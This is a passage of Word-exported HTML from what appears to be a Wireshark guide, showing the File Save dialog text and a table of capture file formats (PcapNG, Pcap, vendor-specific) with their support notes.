style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >The File Save dialog box</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;" ><a name="_bookmark310" ></a><span><a href="#_bookmark311" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Table 4-1</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >summarizes the different formats that Wireshark supports. Depending on which version Wireshark is running or produced the capture file, the capture will be one of the two primary supported file formats.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:10.6500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark311" ></a><span><a href="#_bookmark310" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Table 4-1:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Common Wireshark Capture File Formats</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><table class=MsoNormalTable  border=1  cellspacing=0  style="border-collapse:collapse;width:467.2500pt;margin-left:14.4000pt;mso-table-layout-alt:fixed;border:none;mso-border-left-alt:1.0000pt solid rgb(191,191,191);mso-border-top-alt:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);mso-border-insideh:1.0000pt solid rgb(191,191,191);mso-border-insidev:1.0000pt solid rgb(191,191,191);mso-padding-alt:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;" ><tr style="height:21.5000pt;" ><td width=302  valign=top  style="width:181.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:1.0000pt solid rgb(191,191,191);mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><b><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-weight:bold;font-size:15.0000pt;" >FORMAT/EXTENSION</span></b><b><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-weight:bold;font-size:15.0000pt;" ><o:p></o:p></span></b></p></td><td width=301  valign=top  style="width:180.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:1.0000pt solid rgb(191,191,191);mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><b><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-weight:bold;font-size:15.0000pt;" >INFORMATION</span></b><b><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-weight:bold;font-size:15.0000pt;" ><o:p></o:p></span></b></p></td><td width=175  valign=top  style="width:105.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:1.0000pt solid rgb(191,191,191);mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><b><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-weight:bold;font-size:15.0000pt;" >SUPPORT</span></b><b><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-weight:bold;font-size:15.0000pt;" ><o:p></o:p></span></b></p></td></tr><tr style="height:19.0000pt;" ><td width=302  valign=top  style="width:181.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:none;mso-border-bottom-alt:none;" ><p class=18  style="margin-top:1.8500pt;line-height:16.1500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >PcapNG</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=301  valign=top  style="width:180.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:none;mso-border-bottom-alt:none;" ><p class=18  style="margin-top:1.8500pt;line-height:16.1500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >This is the next-</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=175  valign=top  style="width:105.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:none;mso-border-bottom-alt:none;" ><p class=18  style="margin-top:1.8500pt;line-height:16.1500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >New default</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:17.2500pt;" ><td width=302  valign=top  style="width:181.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:none;border-bottom:none;mso-border-bottom-alt:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=301  valign=top  style="width:180.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:none;border-bottom:none;mso-border-bottom-alt:none;" ><p class=18  style="margin-top:0.1000pt;line-height:16.1500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >generation format</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=175  valign=top  style="width:105.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:none;border-bottom:none;mso-border-bottom-alt:none;" ><p class=18  style="margin-top:0.1000pt;line-height:16.1500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >for Wireshark,</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:17.2500pt;" ><td width=302  valign=top  style="width:181.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:none;border-bottom:none;mso-border-bottom-alt:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=301  valign=top  style="width:180.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:none;border-bottom:none;mso-border-bottom-alt:none;" ><p class=18  style="margin-top:0.1000pt;line-height:16.1500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >supported by libpcap from</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=175  valign=top  style="width:105.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:none;border-bottom:none;mso-border-bottom-alt:none;" ><p class=18  style="margin-top:0.1000pt;line-height:16.1500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >tcpdump, and</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:17.2500pt;" ><td width=302  valign=top  style="width:181.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:none;border-bottom:none;mso-border-bottom-alt:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=301  valign=top  style="width:180.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:none;border-bottom:none;mso-border-bottom-alt:none;" ><p class=18  style="margin-top:0.1000pt;line-height:16.1500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >version 1.1.0 and onward.</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=175  valign=top  style="width:105.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:none;border-bottom:none;mso-border-bottom-alt:none;" ><p class=18  style="margin-top:0.1000pt;line-height:16.1500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >other tools</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:19.7000pt;" ><td width=302  valign=top  style="width:181.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:none;border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=301  valign=top  style="width:180.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:none;border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=175  valign=top  style="width:105.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:none;border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:0.1000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >using libpcap.</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:16.3500pt;" ><td width=302  valign=top  style="width:181.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:0.7500pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:none;mso-border-bottom-alt:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:12.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=301  valign=top  style="width:180.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:none;mso-border-bottom-alt:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:12.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=175  valign=top  style="width:105.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:none;mso-border-bottom-alt:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:12.0000pt;" ><o:p>&nbsp;</o:p></span></p></td></tr></table></div>
<span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section163" ><table class=MsoNormalTable  border=1  cellspacing=0  style="border-collapse:collapse;width:467.2500pt;margin-left:14.4000pt;mso-table-layout-alt:fixed;border:none;mso-border-left-alt:0.7500pt solid rgb(191,191,191);mso-border-top-alt:0.7500pt solid rgb(191,191,191);mso-border-right-alt:0.7500pt solid rgb(191,191,191);mso-border-bottom-alt:0.7500pt solid rgb(191,191,191);mso-border-insideh:0.7500pt solid rgb(191,191,191);mso-border-insidev:0.7500pt solid rgb(191,191,191);mso-padding-alt:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;" ><tr style="height:140.1000pt;" ><td width=302  valign=top  style="width:181.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:0.7500pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:none;border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-left:2.6000pt;line-height:16.8000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >Pcap</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=301  valign=top  style="width:180.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:none;border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="line-height:16.8000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >The original pcap format.</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=175  valign=top  style="width:105.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:none;border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-right:9.2000pt;line-height:101%;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >This is the most supported pcap format, as all tools using libpcap will be able to parse it.</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:19.0000pt;" ><td width=302  valign=top  style="width:181.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:none;mso-border-bottom-alt:none;" ><p class=18  style="margin-top:1.5000pt;line-height:16.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >Vendor-specific formats</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=301  valign=top  style="width:180.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:none;mso-border-bottom-alt:none;" ><p class=18  style="margin-top:1.5000pt;line-height:16.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >Wireshark supports a</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=175  valign=top  style="width:105.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:none;mso-border-bottom-alt:none;" ><p class=18  style="margin-top:1.5000pt;line-height:16.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >Highly specific</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:17.2500pt;" ><td width=302  valign=top  style="width:181.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:none;border-bottom:none;mso-border-bottom-alt:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=301  valign=top  style="width:180.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:none;border-bottom:none;mso-border-bottom-alt:none;" ><p class=18  style="line-height:16.2500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >good portion of capture</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=175  valign=top  style="width:105.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:none;border-bottom:none;mso-border-bottom-alt:none;" ><p class=18  style="line-height:16.2500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >to the vendor.</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:17.2500pt;" ><td width=302  valign=top  style="width:181.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:none;border-bottom:none;mso-border-bottom-alt:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=301  valign=top  style="width:180.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:none;border-bottom:none;mso-border-bottom-alt:none;" ><p class=18  style="line-height:16.2500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >formats available from</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=175  valign=top  style="width:105.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:none;border-bottom:none;mso-border-bottom-alt:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p></td></tr><tr style="height:17.2500pt;" ><td width=302  valign=top  style="width:181.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:none;border-bottom:none;mso-border-bottom-alt:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:13.0000pt;" 